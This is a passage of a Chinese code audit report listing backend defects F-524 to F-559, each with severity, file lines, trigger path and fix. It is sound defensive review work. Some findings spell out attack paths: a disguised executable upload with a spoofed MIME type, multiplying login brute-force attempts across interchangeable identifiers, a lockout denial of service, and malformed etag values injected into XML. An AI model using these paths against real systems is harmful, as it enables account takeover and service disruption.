- 影响面：当前共享 `server.redisForQueue`（BullMQ 按 shared 处理不 quit），不阻塞退出；但 Queue 生命周期长于 Fastify，一旦改独立连接/加 QueueEvents 即成真实连接泄漏。
- 建议修法：onClose 内关闭两个 Queue（已有实例才关），或导出 `closeRegistryQueues()`。
- 是否当场可修：是。

#### F-524 worker 入口不执行 index 关停相位：`auto-rollback` 非 unref 定时器与 mock 网关在 worker 侧无停止路径
- 严重度：P3（`CANARY_ENABLED=true` 且关停链路挂起时升级 P2）
- 文件与行号：`server.ts:460`（`startAutoRollbackMonitor`，worker 也经 `worker-entry.ts:33` 调 `buildServer()`）；`services/auto-rollback.ts:121-139,144-150`；`index.ts:419`（唯一 stop 调用）；`worker-entry.ts:86-95`；mock 网关 `worker-entry.ts:42` + `services/payment-mock-gateway.ts:467`
- 触发路径：`start:worker` → `buildServer()` → 非 unref 定时器 → SIGTERM → worker shutdown 无 `stopAutoRollbackMonitor`，仅靠末尾 `process.exit(0)`；若 `server.close()`/任一 onClose 挂起，`process.exit` 到不了，ref 定时器钉住事件循环。
- 根因：两个入口关停职责不一致——API 靠 `index.ts` 相位，worker 只靠 `server.close()` 的 onClose；而 `startAutoRollbackMonitor` 在 `buildServer()` 里启动、stop 却在 `index.ts`，未注册 onClose。
- 证据：`server.ts:460` vs `index.ts:419`；`worker-entry.ts:86-95` 无这两个 stop；`auto-rollback.ts` 的 `setInterval` 后无 `unref`；`close()` 存在但零调用。
- 影响面：正常路径有 `process.exit(0)` 兜底；异常/挂起路径下 worker 无法自然退出，滚动发布依赖 SIGKILL，可能拖长发布窗口并丢失 BullMQ 优雅排空。
- 建议修法：把 `stopAutoRollbackMonitor` 与 `registerPoolTrackerCleanup(server)` 移入 `buildServer()` 的 onClose；`worker-entry.ts` 保存 `gateway` 并在 shutdown 调 `gateway.close()`；`server.close()` 加超时。
- 是否当场可修：是。

### 第十八轮未判定（证据不足，不计入结论）
1. **`routes/notifications.ts:365-368,404-407`** 用数值 `roleId < ADMIN_ROLE_ID` 手判，与全仓 `requireAdmin` 权限位模型并存；当前 fail-closed（匿名/低角色均 403），不构成绕过，故不计入缺陷，仅登记口径漂移风险。
2. **注册矩阵静态分析限制**：路径用模板字符串/变量拼接的路由被提取器跳过，未计入 4,677 个唯一 `method+path`；静态分析也不区分 `if (env)` 条件注册。需 `app.printRoutes()` 运行时确认（只读约束下未启动服务）。
3. **`educationPlatformRoutes` 同一插件实例双注册**：插件级副作用（`decorate`/`addHook`/限流规则）未验证；文件内未见 `decorate`，风险低。
4. **`mobile-chat POST /circles/:id/messages` 的 slug 死分支**：`:819` 先 `isUuidString` 否则 404，导致 `findCircleByIdOrSlug` 的 slug 能力不可达，客户端用 slug 发帖得 404；属功能不一致，非安全缺陷。
5. **`legacy-exam /exam/recommend|hot`** 只 `status=1` 未查 `isPublished`，与 `legacy-batch /batch/exams` 口径不一致，但仅泄漏试卷元数据（无题目/答案），证据不足以定级。
6. **`v1-batches`/`v1-assistants` 未挂 `requireApiKeyQuota`**：与 F-277/F-299 同类，但前者未见 `recordCall`/扣费实现、后者 run 链路已被 F-243 判恒 401，无法证实真实放大，不立新发现。
7. **`startUsdtPaymentWorker` 在 `redisForQueue` 为空时 `return {} as Worker`** 会使 `index.ts:431` 的 `w.close()` 抛 TypeError；但 `plugins/redis.ts:78-87` 无条件 decorate，正常启动不可达。
8. **`stopScheduledWarmup` 是空关停相**（`index.ts:421`）：`startScheduledWarmup` 全仓从未被调用，属 F-122 同型的反向不配对，当前无运行时后果，仅说明缓存预热未启用。
9. `workers/scheduler-worker.ts` 内无 `setInterval`（Grep 已确认），其关闭生命周期由 `workers/index.ts` 管理，无新增。

---

## 二十三、第十九轮新增（services 逐文件 / db 逐行 / 金额精度与时区）

> 覆盖方式：五路并行只读审计。A=知识/RAG 服务群；B=存储/转换服务群；C=运维/调度服务群；D=db 查询层逐行（16 个文件）；E=金额精度与时区横切。主代理复核了 F-525、F-526、F-549、F-568、F-573、F-574、F-577。

#### F-525 会话导入去重四元组漏 `collectionName`，换集合导入被静默判重
- 严重度：P2
- 文件与行号：`services/knowledge-rag-service.ts:262-278`（去重）、`:280-295`（写入）、`:382`（检索按 collection 过滤）、`:165`（默认 `'default'`）
- 触发路径：用户先把会话 A 导入默认集合，再带 `collectionName='work'` 导入同一会话 → 去重命中 → 返回旧 `docId` 且 `deduped:true`；随后按 `work` 检索零命中。
- 根因：去重 `where` 只有 `ownerUuid + contentHash + sourceType + status`，没有 `collectionName`，而写入与检索都把集合当独立分区。
- 证据：主代理复核 `:267-274` 的四条件；`:285` 写入时才有 `collectionName`；`:382` 的 `collection_name = ?`。
- 影响面：多集合用户「导入成功」但内容不在目标集合，检索与 RAG 上下文均缺失（失败当成功）。
- 建议修法：去重条件加 `eq(knowledgeDoc.collectionName, collectionName)`；唯一索引设计为 `(owner_uuid, content_hash, source_type, collection_name)`。
- 是否当场可修：是。

#### F-526 embedding 失败全链路静默：空 catch + 按 NULL 入库 + 仍报成功
- 严重度：P2
- 文件与行号：`services/knowledge-rag-service.ts:61-70`（`catch { return null }`，本文件无 logger）、`:190-204`（维度不符置 null）、`:204-205`（照常插入并返回 chunkCount）
- 触发路径：key 失效 / 配额耗尽 / 上游 5xx / 超时（F-144）/ 返回非 1536 维 → 上传与 `/ingest` 全部「成功」，所有 chunk `embedding=NULL`，此后检索静默退化为 F-140 的全表关键词扫描。
- 根因：错误路径无日志、无计数、无降级标识；`_ingestChunks` 把 `embedding=null` 当合法值。
- 证据：主代理复核 `:64-69` 的空 catch、`:200` 的三元置 null、`:205` 的正常返回。
- 影响面：全库无声失去语义检索，排查只能翻库看 `embedding IS NULL`；失败的 HTTP 调用成本照付。
- 建议修法：catch 内 `logger.warn` + 失败计数；连续 N 次失败熔断并在入库结果返回 `embeddingDegraded`；provider 层统一校验维度并抛错。
- 是否当场可修：是。

#### F-527 团队知识修订流只有 limit 无 offset，且用 `asc` 取前 N 恰好排除最新版本
- 严重度：P3
- 文件与行号：`services/knowledge-team-service.ts:723-733,740-745`；`routes/knowledge-team.ts:60-63`
- 触发路径：某条目修订 >50 次后 `GET /api/team-knowledge/items/:itemId/revisions`。
- 根因：过滤参数无 offset/cursor；条目分支 `orderBy(asc(revisionNo))` + `limit`。
- 证据：`:723-733` 的 order/limit；`revisionsQuerySchema` 仅 `action/limit`。
- 影响面：审计/定责看不到最近改动，也无法翻页。
- 建议修法：条目流改 `desc(revisionNo)` + `beforeRevisionNo` 游标；空间流加 offset。
- 是否当场可修：是。

#### F-528 `listSpaces` 无分页参数、服务端固定 50 条上限
- 严重度：P3
- 文件与行号：`services/knowledge-team-service.ts:373-377,390-402`；`routes/knowledge-team.ts:65-71`
- 触发路径：团队空间 >50 时 `GET /api/team-knowledge/spaces?teamId=...`。
- 根因：路由不暴露分页参数，服务端默认截断；排序键 `updatedAt` 非唯一。
- 证据：`:390-402` 的 `clampLimit` 默认 50；schema 无 limit/offset。
- 影响面：列表静默缺项，用户无法访问后建空间。
- 建议修法：暴露 limit/offset 或游标；排序加 `id` tiebreak。
- 是否当场可修：是。

#### F-529 repo-wiki 生成忽略请求里的 `model`，始终用环境变量默认模型
- 严重度：P3
- 文件与行号：`services/repo-wiki-service.ts:85-91,484-501,431-432`；`routes/repo-wiki.ts:30,78`
- 触发路径：`POST /api/repo-wiki/generate {"model":"gpt-4o"}`。
- 根因：`WikiLlmCaller` 签名无 model 形参，`generateRepoWiki` 从未读取 `input.model`。
- 证据：`:498-501`、`:514` 只传两个参数；`:431-432` 只读 `AI_REPO_WIKI_MODEL`。
- 影响面：用户以为换了模型，实际按默认模型计费/出结果，契约与响应不一致。
- 建议修法：给 caller 增加 model 形参并透传，不支持时显式 400。
- 是否当场可修：是。

#### F-530 `repoName` 写入不 trim、读取 trim，带空白生成的 wiki 永远不会被聊天注入
- 严重度：P3
- 文件与行号：`services/repo-wiki-service.ts:530-531,540-541`；`services/repo-wiki-context.ts:64,75`；`routes/repo-wiki.ts:29`
- 触发路径：传 `" my-repo "` 生成成功；聊天时同名（带空格）→ 上下文层 trim 成 `"my-repo"` → 查询不中。
- 根因：写读两侧归一化规则不一致。
- 证据：`:530-531` 原样写；`repo-wiki-context.ts:64` trim、`:75` 等值查询。
- 影响面：生成成功但 RAG 永不注入，浪费一次完整 LLM 生成费用。
- 建议修法：写入侧统一 `trim()`（schema 或 service 单点归一化）。
- 是否当场可修：是。

#### F-531 repo-wiki 提示词预算未计入文件清单，注释所称 ~120KB 可被撑到 ~320KB
- 严重度：P3
- 文件与行号：`services/repo-wiki-service.ts:34-35,351-356,358-367`；`routes/repo-wiki.ts:34-39`
- 触发路径：400 个长路径文件（每路径≤500 字符）→ 文件清单最多 200,000 字符 + 正文 122,880 字符。
- 根因：`budgetRepoFiles` 只预算正文，`buildFileTree` 独立拼接且 `MAX_TREE_LINES=500` 大于文件数上限 400（等于不生效）。
- 证据：`:351-356` 的 500 行截断；`:358-367` 直接拼入。
- 影响面：接近上下文窗口时 overview 调用失败 → 路由 502（token 已消耗）。
- 建议修法：文件清单纳入总字符预算，并限制单行长度。
- 是否当场可修：是。

#### F-532 `createItem` 主表插入与 create 审计写入不在同一事务
- 严重度：P3
- 文件与行号：`services/knowledge-team-service.ts:508-543`（insert `:512-528`，`writeRevision` `:530-540`）
- 触发路径：并发同名创建或 `ux_team_knowledge_revisions_item_revision` 唯一冲突 → 条目已提交、审计写入抛错 → 500。
- 根因：与 F-142 同族，create 路径也未包 `db.transaction`（该目录 7 个文件全文无事务）。
- 证据：`:512-528` 与 `:530-540` 两次写无事务包裹。
- 影响面：出现「无 create 审计」的孤儿条目；用户重试又创建重复条目。
- 建议修法：`db.transaction` 包裹 item + revision。
- 是否当场可修：是。

#### F-533 `/api/knowledge/upload` 采信客户端自报 MIME，无扩展名/魔数校验，`sourceType` 据此生成
- 严重度：P3
- 文件与行号：`services/document-parser.ts:223-230`；`routes/knowledge-rag.ts:236,267`；`services/knowledge-rag-service.ts:319-335,343`
- 触发路径：multipart `evil.exe` + `Content-Type: text/plain` → 按 UTF-8 文本入库；或 `.txt` 声明 `application/pdf` → 直接送进 unpdf/anydoc。
- 根因：解析器选择与类型标注完全信任客户端头；本路由未挂 `createUploadPreHandler`，也未像 `routes/files.ts` 那样 `checkMagicNumber`。
- 证据：`:223-230` provided MIME 优先；`:267` `mimeType: data.mimetype`。
- 影响面：任意二进制（含伪装可执行文件）进入知识库并被切片/embedding；解析器被喂非预期格式，扩大解析型 DoS 面。
- 建议修法：复用 `utils/file-type-validator.ts` 的魔数探测，以探测结果决定解析器与 sourceType。
- 是否当场可修：是。

#### F-534 知识库文档列表无分页/上限，全量返回
- 严重度：P3
- 文件与行号：`services/knowledge-rag-service.ts:487-500`；`routes/knowledge-rag.ts:146-150`
- 触发路径：文档数上千的用户 `GET /api/knowledge/docs`。
- 根因：查询与路由都无分页参数，排序键 `createdAt` 非唯一。
- 证据：`:487-500` 无 limit/offset。
- 影响面：响应体与内存随文档数线性增长。
- 建议修法：加 limit/offset 或 `beforeId` 游标，排序加 `id` tiebreak。
- 是否当场可修：是。

#### F-535 共享公式从格把「主格地址」当公式原文，read 返回假公式且受影响公式漏报
- 严重度：P2
- 文件与行号：`services/workbook-service.ts:282-294`（核心 `:286`）；消费点 `:328-334,372-382,460-495`
- 触发路径：`POST /api/workbook/open` 打开含共享公式的 xlsx → `read`/`write`。
- 根因：`formulaOf` 先取 model：`o.formula ? o.formula : o.sharedFormula`；ExcelJS 对共享公式从格的 model 只有 `{sharedFormula:'<主格地址>', result}`，`formula` 为 undefined，因此返回 `"B1"` 这种坐标串。
- 证据：`:286` 的三元；ExcelJS `lib/doc/cell.js` 中 `sharedFormula` 与 `cell.formula` getter 的差异；服务自身契约 `:90` 声明「公式原文」。
- 影响面：从格返回假公式，`indexFormulaCells` 按坐标串解析依赖，`affectedFormulaCells` 漏报真实依赖 → `recalcUnsupported:false` 掩盖失效公式。
- 建议修法：优先取 `cell.formula`（ExcelJS 已实现 shared→translated），`sharedFormula` 只作「是否公式」判据。
- 是否当场可修：是。

#### F-536 `/workbook/open` 的归属判据依赖只有 `/save` 会写的元数据，普通上传的 xlsx 恒 404
- 严重度：P2（若产品定义 open 仅消费 save 产物，则降为 P3 设计确认项）
- 文件与行号：`services/workbook-service.ts:544-550,783-790`；`services/storage-service.ts:37-38,74-76`；`routes/files.ts:179,236-239`
- 触发路径：用户经 `/api/files` 上传 xlsx 拿到 fileId → `POST /api/workbook/open {fileId}` → 恒 `WORKBOOK_FILE_NOT_FOUND`。
- 根因：open 在 `storage/uploads/<fileId>` 找文件并要求 sidecar `ownerId`，而全仓只有 `saveWorkbook` 写 sidecar；普通上传落 `uploads/public` 且不写元数据。
- 证据：`:544-550` 的 getFileInfo + ownerId 比对；`:783-790` 是唯一 `saveFile(..., {ownerId})`；`files.ts:236-239` 写 `UPLOAD_DIR`。
- 影响面：「打开已有工作簿」主用例不可用；ai-service 按「先 /files 再 /workbook/open」串联会稳定失败。
- 建议修法：open 先按 files 表/上传目录解析真实路径，归属改查 files 表的 userId。
- 是否当场可修：是。

#### F-537 PDF 生成失败一律折叠成「空白 PDF + 200」，三处调用方均不检查 `stub`
- 严重度：P2
- 文件与行号：`services/pdf-service.ts:225-229,343-347,426-432`；调用方 `routes/report.ts:258-267`、`routes/edu-public.ts:388-400`、`routes/user/ai-modules-routes.ts:446-455`
- 触发路径：未安装 pdfkit / 字体注册或渲染抛错 / 任意同步异常。
- 根因：`generateReportPDF` 把「无 pdfkit」与「任何异常」都 `resolve(stub(...))`，`stub=true` 甚至带 `error`，但调用方只取 `.buffer` 直接 send。
- 证据：`:226-229`、`:343-347`、`:426-432`；三个调用方均 `.send(pdfResult.buffer)` 无 `stub` 判断。
- 影响面：正式报表、学员报告、**付费触发的 AI 生涯指导报告**失败时静默交付空白文件且计成功。
- 建议修法：调用方检查 `stub` → 503/502；或服务层改为 reject。
- 是否当场可修：是。

#### F-538 relay 会话历史的写入口全仓无调用，会话 API 恒空
- 严重度：P2
- 文件与行号：`services/relay-conversation-service.ts:83-121,127-182`；`routes/relay-conversations.ts:20-25,52-158`
- 触发路径：`GET /api/developer/conversations`、`/:id/messages`。
- 根因：路由只导入读/删/改标题；`getOrCreateConversation`、`appendMessage` 全仓无 import 调用点，两张表也无其他 insert。
- 证据：`relay-conversations.ts:20-25` 的 import 清单；全仓 grep 两函数仅命中定义；`data-archive-service.ts:314` 只有删除。
- 影响面：整个「中转站会话历史」永久空列表，PATCH/DELETE 永远 404。
- 建议修法：在 relay 完成链路接入两个写函数（同事务 + 幂等键），或明确下线该 API。
- 是否当场可修：是（需先确认写入方归属）。

#### F-539 relay 会话/消息分页排序无 tie-breaker
- 严重度：P3
- 文件与行号：`services/relay-conversation-service.ts:206,252`；路由 `routes/relay-conversations.ts:61-65,91-94`
- 触发路径：`lastMessageAt` 或 `createdAt` 相同（批量创建/同毫秒）时翻页。
- 根因：`orderBy(desc(lastMessageAt))` / `asc(createdAt)` 未追加主键。
- 证据：`:206`、`:252`；路由用 offset 分页。
- 影响面：边界处丢行或重复。
- 建议修法：追加 `id` 作为次序键，或改 keyset 分页。
- 是否当场可修：是。

#### F-540 workbook `save` 与 `write` 无会话级互斥，`await writeBuffer()` 期间可被并发改写
- 严重度：P3
- 文件与行号：`services/workbook-service.ts:747-770,804-805`；并发写侧 `:714-717`
- 触发路径：同一 handle 上并发 `save` 与 `write`（或两次 save）。
- 根因：`takeSession` 无锁；`saveWorkbook` 在 `:770` `await writeBuffer()` 让出事件循环，另一请求改写同一 ExcelJS 实例并 push `touched`；随后 `:805 recalcView` 基于「写后」状态生成 `staleFormulaCells`。
- 证据：`:770` 的 await 与 `:805` 的视图计算之间无快照/锁。
- 影响面：save 响应与实际新档不一致（agent 据此误判）；两次并发 save 各落一份。
- 建议修法：每 session 一把互斥队列，save 前 clone 或冻结批次。
- 是否当场可修：是。

#### F-541 单元格地址校验超出 xlsx 规格（行 9,999,999 / 列 ZZZ），可产出 Excel 判损坏的工作簿
- 严重度：P3
- 文件与行号：`services/workbook-service.ts:159-160,180-188,52,687-703,714-716`
- 触发路径：`POST /api/workbook/write` 传 `address: "A9999999"` 或 `"ZZZ1"`。
- 根因：`CELL_RE` 允许行到 9,999,999、列到 ZZZ(=18,278)，超过 xlsx 上限（1,048,576 × 16,384/XFD）；`MAX_WRITE_CELLS` 只限条数不限坐标。
- 证据：`:160` 正则；`:186-187` 只判 `column>=1`。
- 影响面：save 产物含越界 dimension，Excel/WPS 提示修复或拒绝打开。
- 建议修法：`parseCellRef` 增加 `row<=1048576 && column<=16384`。
- 是否当场可修：是。

#### F-542 转码 `resolution` 参数被静默丢弃，任务仍报 completed
- 严重度：P3
- 文件与行号：`services/transcode-service.ts:58-65,88,210-219,230-234`；入口 `routes/transcode.ts:98-105`
- 触发路径：`POST /api/transcode/jobs {preset:'video/mp4', resolution:'720p'}`。
- 根因：`TranscodeJob` 不保存 `resolution`，`startTranscodeJob` 重建 `TranscodeInput` 时只填 `inputPath/preset`。
- 证据：`:230-233` 重建对象缺 resolution；`:88` 的 scaleFilter 恒 null。
- 影响面：480p/720p/1080p 全部不生效，输出保持原分辨率且报成功。
- 建议修法：`TranscodeJob` 落 resolution 并在启动时带上；或移除该参数。
- 是否当场可修：是。

#### F-543 取消一个「已完成」任务会改状态为 cancelled 并 `rm -rf` 输出目录
- 严重度：P3
- 文件与行号：`services/transcode-service.ts:321-333,343-349`；入口 `routes/transcode.ts:152-158`
- 触发路径：任务 completed 后 `POST /api/transcode/jobs/:jobId/cancel`。
- 根因：`cancelTranscodeJob` 不区分状态，无条件置 cancelled 并 `rm(outputDir)`；DELETE 复用同一函数。
- 证据：`:327` 无条件置态；`:345` 的 rm；路由无状态前置校验。
- 影响面：已完成任务成果被删，`/download` 404，审计/计费口径被改写。
- 建议修法：cancelled 仅对 pending/processing 生效；completed/failed 返回当前态。
- 是否当场可修：是。

#### F-544 `stderrBuffer` 无上限累积，且每 chunk 对全量缓冲做正则扫描（O(n²)）
- 严重度：P3
- 文件与行号：`services/transcode-service.ts:246-257,177-190,296`
- 触发路径：长视频转码或畸形输入导致 stderr 刷屏。
- 根因：`stderrBuffer += chunk` 永不裁剪；`:250` 每 chunk 对已累积全量执行 `match(/time=.../)`；`REDACT_TAIL_MAX_CHARS=500` 只在结束时生效。
- 证据：`:246-257`；`:177` 的常量仅用于输出。
- 影响面：小时级任务 stderr 达数 MB～数十 MB 常驻，CPU 放大。
- 建议修法：只保留尾部 N KB；进度解析改对单个 chunk 或 tail。
- 是否当场可修：是。

#### F-545 `callOss` 的 fetch 无超时、无响应体大小上限，错误串拼接整段 OSS 响应
- 严重度：P3
- 文件与行号：`services/storage-service.ts:622-637`
- 触发路径：OSS 慢响应/挂起，或 4xx/5xx 返回大 body。
- 根因：`fetch(fullUrl, {...})` 无 `signal`；`await resp.text()` 不限长；`throw new Error(... ${respBody})` 把完整 body 带进错误。
- 证据：`:623-627`、`:633`、`:635-637`。
- 影响面：分片 init/upload/complete/abort 四端点可被单次挂起拖住；大 body 放大内存与日志。
- 建议修法：`AbortSignal.timeout(15s)` + 响应体截断后再拼错误。
- 是否当场可修：是。

#### F-546 CompleteMultipartUpload 的 `etag` 原样拼进 XML（未转义、无上限），`parts` 数组无上限
- 严重度：P3
- 文件与行号：`services/storage-service.ts:782-785`；入口 `routes/oss.ts:111-121,523-533`
- 触发路径：登录用户对自有 uploadId 提交超长或含 `<>` 的 `parts[].etag` / 超多 parts。
- 根因：路由 zod 仅 `etag: z.string().min(1)`、`parts` 无 max；服务端模板字符串直接插值。
- 证据：`oss.ts:113-121`；`storage-service.ts:783-785`。
- 影响面：可构造畸形 XML 使自身任务失败，并放大请求体与内存；不构成越权（uploadId 已校验 userId）。
- 建议修法：etag 限 `^[A-Fa-f0-9]{1,128}$`、parts `.max(10000)`，XML 转义。
- 是否当场可修：是。

#### F-547 腾讯云/AWS 的 STS fetch 无超时、不判 HTTP 状态，响应体不限长
- 严重度：P3
- 文件与行号：`services/oss-sts-service.ts:170-184,285-298`
- 触发路径：`POST /api/oss/sts` 时 STS 端点慢/挂起，或边缘返回非 JSON/大 HTML。
- 根因：两处 `fetch` 无 `signal`；腾讯直接 `await resp.json()` 不检查 status；AWS `await resp.text()` 不限长。
- 证据：`:170-182`、`:184`、`:285-294`、`:296-299`。
- 影响面：STS 抖动时请求无限挂起；错误被归一成「未知失败」，排障困难。
- 建议修法：`AbortSignal.timeout(10s)` + 先判 `resp.ok` + 截断 text。
- 是否当场可修：是。

#### F-548 大 xlsx 降级路径 `Math.max(...rows)` 参数溢出抛 RangeError，被吞成「解析结果为空」
- 严重度：P3
- 文件与行号：`services/markdown-converter-service.ts:216-229`（`:218`）、`:438-441`、`:521-524`
- 触发路径：anydoc 失败 → legacy `xlsxToMarkdown` → 行数超过 V8 展开参数上限（约 10 万级）的 xlsx。
- 根因：`Math.max(...rows.map(r => r.length))` 展开为实参超限；`legacyToMarkdown` 的 catch 只 `logger.error` 后 `return ''`。
- 证据：`:218`、`:438-441`、`:521-524`。
- 影响面：用户拿到错误归因（以为文件无文本），大表永远走不到可用输出。
- 建议修法：改 `rows.reduce((m,r)=>Math.max(m,r.length),0)`；catch 区分 RangeError。
- 是否当场可修：是。

#### F-549 文件清理每小时递归删除 `uploads` 全目录 >24h 文件，命中持久化的 `uploads/public` 用户文件
- 严重度：P1
- 文件与行号：`services/cleanup-service.ts:32,60-86,124,126-137,140-152`；持久化写入 `routes/files.ts:179,236-239`、`routes/workspace.ts:70-72`、`routes/chunked-upload.ts:72-76`
- 触发路径：默认 `ENABLE_WORKER!=='false'` 启动 scheduler → 每小时 `file-cleanup-hourly` → 递归扫描 `<cwd>/uploads` → 所有 `mtime < now-24h` 文件被 `unlinkSync`。
- 根因：`TARGET_DIRS = ['uploads','outputs']` 递归整树，未区分临时目录与持久化目录，也无 DB 引用检查。
- 证据：主代理复核 `:32` 的字面量、`:60-86` 的递归、`:131-137` 仅按 mtime 删除；`routes/files.ts:179` 默认写入 `join(cwd,'uploads','public')`；`Grep uploads/public` 确认多处在写。
- 影响面：用户上传的图片/附件与工作区项目文件在 24 小时后被物理删除，DB 记录与 URL 仍指向该文件 → 永久 404 / 数据丢失；uploads 超 1GB 时更早被删。
- 建议修法：清理范围收敛到 `uploads/chunks`、`uploads/tmp`、`outputs`，显式排除 `uploads/public`/`uploads/private`；或按 files 表引用删除。
- 是否当场可修：是。

#### F-550 对账只比较订单号是否存在，完全不校验金额与交易状态
- 严重度：P2
- 文件与行号：`services/reconciliation-service.ts:157-161,253-258,266-291`
- 触发路径：每日 `reconciliation-daily` → 解析远端账单 → `buildDiff` 只用 `outTradeNo` 做集合差。
- 根因：`RemoteTrade.amount/tradeStatus` 被解析出来但未参与比较；`buildDiff:272-283` 仅判单号存在性。
- 证据：`:256-258` 取三字段；`:272-283` 只用单号。
- 影响面：少付/费率差/部分退款/远端已关闭的订单全部判「已对上」，资金口径长期不一致且无差异输出。
- 建议修法：金额归一到分后逐单比较；`tradeStatus` 建允许集合；退款单列差异类型。
- 是否当场可修：是。

#### F-551 支付宝账单下载不判 HTTP 状态/内容类型，错误页被当「平台无交易」，调度层仍记 success
- 严重度：P2
- 文件与行号：`services/reconciliation-service.ts:58-64,65-74`；`workers/scheduler-worker.ts:322-337`
- 触发路径：`downloadBillUrl` 返回网关 5xx/404/维护页 HTML → `resp.text()` 照常解析 → 空数组 → `remoteCount=0`，全部本地已付单进 `onlyLocal`。
- 根因：未判 `resp.ok/status/content-type`；解析失败不抛错；`ReconcileResult.error` 只在 catch 出现且调用方不消费。
- 证据：`:59-60` 裸 fetch + text；`:65-74` catch 返回空 diff；`scheduler-worker.ts:332-336` 无条件记 success。
- 影响面：账单下载失败时面板显示「对账成功」，真实差异被「平台 0 笔」掩盖。
- 建议修法：`if (!resp.ok) throw`；校验 content-type；`error` 非空时记 failed 并告警。
- 是否当场可修：是。

#### F-552 过期监听把「Redis 缓存写入失败」当作检测失败，连续 4 轮可触发生产 Canary 回滚
- 严重度：P2（需 canary 配置存在且 isActive）
- 文件与行号：`services/expiration-monitor-service.ts:122-134,159-169,207-210,269-318`
- 触发路径：DB 已成功改状态 → `markProcessed`/`recordSuccess` 的 Redis 命令报错 → 异常冒泡 → `recordFailureAndMaybeRollback` 自增 → 连续 4 次（30s×4）→ `rollbackCanary`。
- 根因：把「检测逻辑失败」与「去重缓存写入失败」合并在同一 try/catch。
- 证据：`:126-133`、`:163-168`、`:291-293`；`:273-278,303-308` 任何异常都走失败计数。
- 影响面：Redis 抖动会让健康系统被自动回滚，失败计数失真。
- 建议修法：DB 更新成功后单独 try 包裹缓存写入；`recordSuccess` 移出检测 try。
- 是否当场可修：是。

#### F-553 `archiveDailyData` 仍有 4 张表用单条 `DELETE ... RETURNING` 全量物化
- 严重度：P2（F-343/F-352 模式的新实例）
- 文件与行号：`services/data-archive-service.ts:281-285,297-301,313-317,326-330`
- 触发路径：每日 `data-archive-daily` 首跑，`relay_messages`（180 天、此前无清理路径）、`audit_logs`（90 天）、`messages`（180 天）积压巨大。
- 根因：仅 `chat_messages`、`conversation_message_archives` 走了 `purgeExpiredBatched`，其余 4 段仍一次事务删全量并读回所有 id。
- 证据：`:281-285`、`:297-301`、`:313-317`、`:326-330`；对照 `:342-368` 的分批实现。
- 影响面：内存峰值（百万级 UUID）+ 单条长 DELETE 持锁，可能阻塞写入并拖死 scheduler worker。
- 建议修法：全部改为分批主键删除；首跑加 `statement_timeout`。
- 是否当场可修：是。

#### F-554 原子快照无保留期/配额/GC，且失败会留下不可见孤儿目录
- 严重度：P2
- 文件与行号：`services/atomic-rollback.ts:107-109,199-233,236-263`；`routes/workspace-ai.ts:1884-1926`
- 触发路径：`POST /atomic-checkpoint`（仅 requireAuth + workspace 权限，无 rateLimit）反复调用，每次复制最多 3000 个 ≤1MB 文件。
- 根因：快照只增不删；`createAtomicCheckpoint` 在写 `meta.json` 前失败时留下无 meta 的目录，`listAtomicCheckpoints` 因 `loadMeta` 返回 null 而忽略，永不被清理。
- 证据：`:108-109` 上限常量；`:207-232` 复制与 meta 顺序；全文件无快照清理；路由 `:1885` 无 rateLimit。
- 影响面：磁盘被单用户耗尽，服务整体写失败；孤儿目录不可见。
- 建议修法：保留最近 N 份，创建失败时 `rm(dir)`，路由加频率限制与配额。
- 是否当场可修：是。

#### F-555 账户锁定在 Redis 故障期写进程内 Map，恢复后只读 Redis，累计失败与锁定瞬间失效
- 严重度：P3
- 文件与行号：`services/account-lockout.ts:108-128,132-146,150-165`
- 触发路径：Redis 命令报错 → 失败写入 `fallbackStore`；Redis 恢复后 `getLockRemainingMs` 直接查 Redis 返回 0。
- 根因：两套存储无合并读取；成功路径不检查 fallback。
- 证据：`:109-110`、`:123-128`、`:137-140`、`:151-159`。
- 影响面：攻击者在 Redis 抖动窗口获得 `5×实例数` 次尝试，恢复后计数清零。
- 建议修法：锁定查询取两存储最大值；或 Redis 不可用时 fail-closed。
- 是否当场可修：是。

#### F-556 锁定键按「原始账号字符串」分桶，用户名/手机号/邮箱三个可互换标识各占一份配额
- 严重度：P3
- 文件与行号：`services/account-lockout.ts:10-23,67-70,112-113`；`db/queries.ts:50-59`；`routes/auth.ts:824,840,848`；`routes/auth-extended.ts:883,906`
- 触发路径：攻击者对同一账号分别用用户名、邮箱、手机号各失败 5 次。
- 根因：`normalizeAccount` 只做 trim+lowercase，未解析到唯一 `userId`；文件头 `:20-23` 的声明与实现不符。
- 证据：`db/queries.ts:57` 的三选一查询；`:112-113` key 只拼接字符串。
- 影响面：单账号 15 次/15 分钟而非 5 次，撞库配额放大 3 倍。
- 建议修法：按 `user.id` 计数/锁定，或把三个标识映射到同一 key。
- 是否当场可修：是。

#### F-557 `INCR` 与 `EXPIRE` 非原子：一次 EXPIRE 失败会留下永不过期的失败键
- 严重度：P3
- 文件与行号：`services/account-lockout.ts:114-121,123-128`
- 触发路径：`INCR` 成功（count=1）→ `EXPIRE` 因错误/崩溃未执行 → Redis 中失败键无 TTL；之后 `INCR` 因 `count!==1` 永不补 TTL。
- 根因：计数器创建与 TTL 设置分两条命令，无事务/Lua。
- 证据：`:115-118` 的 `if (count===1) expire`；`:119-121` 达阈值只 SET 锁。
- 影响面：失败数永久累积；攻击者每窗口 1 次失败即可维持锁定（放大锁定 DoS）。
- 建议修法：Lua/MULTI 原子执行 INCR+EXPIRE，或先 `SET 0 EX NX` 再 INCR。
- 是否当场可修：是。

#### F-558 `fallbackStore` 无上限、无主动过期，Redis 故障期可被随机账号名撑爆内存
- 严重度：P3
- 文件与行号：`services/account-lockout.ts:61-65,76-94`
- 触发路径：Redis 不可用时用随机账号名高频失败登录。
- 根因：进程内降级存储无容量上限/定期淘汰。
- 证据：`:62-65` 裸 Map；`:80-82` 直接 set；无 LRU/定时清理。
- 影响面：长时间 Redis 故障下内存持续增长，最终 OOM。
- 建议修法：限制 Map 大小并 LRU 淘汰；定期清理超窗口条目。
- 是否当场可修：是。

#### F-559 过期监听的失败处理函数自身无保护，违反「不向调度层抛错」契约
- 严重度：P3
- 文件与行号：`services/expiration-monitor-service.ts:69-74,216-231,275-278,305-308`
- 触发路径：检测失败进入 catch → `recordFailureAndMaybeRollback` 的 INCR/SET 再失败 → 异常抛出；若连接断开且 `maxRetriesPerRequest:null`，命令 promise 长期 pending。
- 根因：catch 分支的失败处理未再 try/catch；Redis 客户端无限重试。
- 证据：`:220,225` 裸 await；`:258-259` 注释声明不抛错；`:72` 无限重试配置。
- 影响面：BullMQ 重试放大或 worker 槽位被永久占用，后续轮次全部阻塞。
- 建议修法：失败处理整体 try/catch；Redis 命令加超时；该服务用独立连接。
